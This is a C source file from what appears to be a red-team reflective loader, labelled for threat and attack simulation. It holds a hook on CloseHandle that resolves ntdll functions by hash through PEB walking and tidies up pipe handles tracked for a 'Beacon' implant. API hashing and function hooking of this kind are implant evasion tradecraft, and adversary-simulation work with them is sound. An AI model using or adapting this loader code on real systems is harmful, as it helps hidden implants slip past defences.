/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

typedef struct
{
	D_API( RtlFreeHeap );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_RTLFREEHEAP	0x73a9e4d7 /* RtlFreeHeap */
#define H_API_NTCLOSE		0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL		0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Removes a pipe handle from the list.
 *
!*/
D_SEC( D ) BOOL WINAPI CloseHandle_Hook( _In_ HANDLE hObject )
{
	API			Api;

	BOOLEAN			Ret = FALSE;

	PTABLE			Tbl = NULL;
	PLIST_ENTRY		Hdr = NULL;
	PLIST_ENTRY		Ent = NULL;
	PPIPE_ENTRY_BEACON	Peb = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.RtlFreeHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
	Api.NtClose     = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	/* Get the table & LIST_ENTRY setup */
	Tbl = C_PTR( G_SYM( Table ) );
	Hdr = C_PTR( & Tbl->Table->PipeList );
	Ent = C_PTR( Hdr->Flink );

	/* Enumerate the complete list of entries */
	for ( ; Ent != Hdr ; Ent = C_PTR( Ent->Flink ) ) {
		/* Pointer to the structures */
		Peb = C_PTR( CONTAINING_RECORD( Ent, PIPE_ENTRY_BEACON, PipeList ) );

		/* Is this our pipe? */
		if ( Peb->Pipe == C_PTR( hObject ) ) {
			/* Remove from the list */
			RemoveEntryList( & Peb->PipeList );
			
			/* Shutdown to the pipe */
			Ret = NT_SUCCESS( Api.NtClose( Peb->Pipe ) ) ? TRUE : FALSE;
			Peb->Pipe = NULL;

			/* Free the memory / block in the pipe tracker */
			Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Peb );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	/* Return */
	return Ret;
};

#endif
